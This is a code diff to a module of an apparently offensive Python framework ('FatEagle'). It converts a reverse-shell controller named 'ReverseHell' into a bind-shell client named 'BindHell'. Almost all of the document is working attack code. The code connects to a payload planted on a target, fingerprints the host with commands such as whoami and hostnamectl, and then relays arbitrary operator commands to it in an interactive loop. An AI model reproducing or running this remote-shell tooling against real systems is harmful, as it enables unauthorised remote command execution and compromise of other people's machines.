@@ -9,11 +9,11 @@ import socket
 import os
 import subprocess
 
-class ReverseHell:
+class BindHell:
     def signal_handler(self,sig, frame):
       self._end()
     signal.signal(signal.SIGINT, signal_handler)
-    _fs = fescripts.libs.fescripts.FE_SCRIPTS("ReverseHell","a FeScript to reverse shell in windows and linux.","""generate a listener for your os (windows or linux), run that on target os, run fescript here and connect to target. BOOM! you have reverse shell access!""",{'ip': {'Body': '', 'Description': 'target ip address', 'Require': True}, 'port': {'Body': '6666', 'Description': 'target port that listens on it', 'Require': True}, 'buffer_size': {'Body': '4096', 'Description': 'maximum buffer size', 'Require': True}},"0xDeviI")
+    _fs = fescripts.libs.fescripts.FE_SCRIPTS("BindHell","a FeScript to bind shell in windows and linux.","""generate a listener for target os (windows or linux), run that on target os, run fescript here and connect to target. BOOM! you have bind shell access!""",{'ip': {'Body': '', 'Description': 'target ip address', 'Require': True}, 'port': {'Body': '6666', 'Description': 'your port that you listen on it', 'Require': True}, 'buffer_size': {'Body': '4096', 'Description': 'maximum buffer size', 'Require': True}},"0xDeviI")
     
     def __init__(self):
       pass
@@ -67,57 +67,54 @@ class ReverseHell:
     def _start(self):
       print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
       # --------------------------------------------> Script Started!
-      try:
-        accCM = ["sysinfo"]
-        defCMs = {
+      accCM = ["sysinfo"]
+      defCMs = {
         "linux":{"hostname":"hostname","version":"hostnamectl | grep Kernel","procarch":"hostnamectl | grep Arch | grep -Po '(?<=Architecture: )[^ ]*'","username":"whoami"},
         "windows":{"hostname":"hostname","version":"ver","procarch":"echo %PROCESSOR_ARCHITECTURE%","username":"echo %username%"}}
-        SERVER_HOST = self._fs._Opt["ip"]["Body"]
-        SERVER_PORT = int(self._fs._Opt["port"]["Body"])
-        BUFFER_SIZE = int(self._fs._Opt["buffer_size"]["Body"])
-        SEPARATOR = "<sep>"
-        sysinfo = ""
-        s = socket.socket()
-        s.bind((SERVER_HOST, SERVER_PORT))
-        s.listen(5)
-        print(f"Listening as {SERVER_HOST}:{SERVER_PORT}")
-        client_socket, client_address = s.accept()
-        print(f"{client_address[0]}:{client_address[1]}" + Fore.LIGHTGREEN_EX + " Connected!" + Fore.RESET)
-        os_type = client_socket.recv(BUFFER_SIZE).decode()
-        cwd = client_socket.recv(BUFFER_SIZE).decode()
-        client_socket.send(defCMs[os_type]["hostname"].encode())
-        output = client_socket.recv(BUFFER_SIZE).decode()
-        results, cwd = output.split(SEPARATOR)
-        cmName = results.replace("\n","").lstrip()
-        client_socket.send(defCMs[os_type]["version"].encode())
-        output = client_socket.recv(BUFFER_SIZE).decode()
-        results, cwd = output.split(SEPARATOR)
-        ver = results.replace("\n","").replace("Kernel: ","").lstrip()
-        client_socket.send(defCMs[os_type]["procarch"].encode())
-        output = client_socket.recv(BUFFER_SIZE).decode()
-        results, cwd = output.split(SEPARATOR)
-        arch = results.replace("\n","").lstrip()
-        client_socket.send(defCMs[os_type]["username"].encode())
-        output = client_socket.recv(BUFFER_SIZE).decode()
-        results, cwd = output.split(SEPARATOR)
-        username = results.replace("\n","").lstrip()
-        sysinfo = f"Computer: {cmName}\nUsername: {username}\nVersion: {ver}\nArchitecture: {arch}\nAccess Type: Reverse Shell Access"
-        del cmName,username,ver,arch
-        while True:
+      SERVER_HOST = self._fs._Opt["ip"]["Body"]
+      SERVER_PORT = int(self._fs._Opt["port"]["Body"])
+      BUFFER_SIZE = int(self._fs._Opt["buffer_size"]["Body"])
+      SEPARATOR = "<sep>"
+      sysinfo = ""
+      s = socket.socket()
+      try:
+        s.connect((SERVER_HOST, SERVER_PORT))
+      except (ConnectionRefusedError):
+        print(Fore.LIGHTRED_EX + "Can't Connect to target!\nReason: Target is down or unreachable!" + Fore.RESET)
+      os_type = s.recv(BUFFER_SIZE).decode()
+      cwd = s.recv(BUFFER_SIZE).decode()
+      s.send(defCMs[os_type]["hostname"].encode())
+      output = s.recv(BUFFER_SIZE).decode()
+      results, cwd = output.split(SEPARATOR)
+      cmName = results.replace("\n","").lstrip()
+      s.send(defCMs[os_type]["version"].encode())
+      output = s.recv(BUFFER_SIZE).decode()
+      results, cwd = output.split(SEPARATOR)
+      ver = results.replace("\n","").replace("Kernel: ","").lstrip()
+      s.send(defCMs[os_type]["procarch"].encode())
+      output = s.recv(BUFFER_SIZE).decode()
+      results, cwd = output.split(SEPARATOR)
+      arch = results.replace("\n","").lstrip()
+      s.send(defCMs[os_type]["username"].encode())
+      output = s.recv(BUFFER_SIZE).decode()
+      results, cwd = output.split(SEPARATOR)
+      username = results.replace("\n","").lstrip()
+      sysinfo = f"Computer: {cmName}\nUsername: {username}\nVersion: {ver}\nArchitecture: {arch}\nAccess Type: Bind Shell Access"
+      del cmName,username,ver,arch
+      while True:
           command = input(Fore.LIGHTRED_EX + f"{cwd}" + Fore.BLUE + " $> " + Fore.RESET)
           if not command.strip():
               continue
           if (command.casefold() == "sysinfo"):
             print(sysinfo)
           if (command.casefold() not in accCM):
-            client_socket.send(command.encode())
-            if command.casefold() == "exit".casefold():
+            s.send(command.encode())
+            if command.lower() == "exit":
                 break
-            output = client_socket.recv(BUFFER_SIZE).decode()
+            output = s.recv(BUFFER_SIZE).decode()
             results, cwd = output.split(SEPARATOR)
             print(results)
-      except:
-        print(Fore.LIGHTRED_EX + "Error: bad requests or wrong port or buffer size" + Fore.RESET)
+      s.close()
       # --------------------------------------------> Script Stopped!
       self._end()
 
